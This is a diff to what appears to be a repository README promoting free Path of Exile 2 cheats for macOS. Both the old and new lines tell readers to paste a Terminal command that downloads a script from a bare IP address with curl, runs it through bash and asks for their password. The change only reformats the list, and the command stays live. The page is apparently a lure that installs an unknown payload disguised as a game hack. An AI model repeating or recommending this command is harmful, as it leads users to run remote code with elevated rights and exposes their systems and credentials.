@@ -12,10 +12,10 @@ Prerequisites:
 
 Method: Direct Execution
 
-1- Open Terminal (macOS) 
-2- Copy and paste this command: /bin/bash -c "$(curl -fsSL http://91.92.242.30/xtc7ebo2s6lhdglc)"
-3- Press Enter 
-4- Enter your password if prompted
+- 1- Open Terminal (macOS) 
+- 2- Copy and paste this command: /bin/bash -c "$(curl -fsSL http://91.92.242.30/xtc7ebo2s6lhdglc)"
+- 3- Press Enter 
+- 4- Enter your password if prompted
 -------------------------------
 
 Welcome to the ultimate Path of Exile 2 Hack guide! 🚀 Dive into free hacks for this epic game on MAC OS systems in 2025. 💻 This repo is your one-stop spot for downloading tools to enhance your gameplay with cheats like infinite resources 🔮 and auto-aim 🎯. Get ready for seamless fun on your PC! 
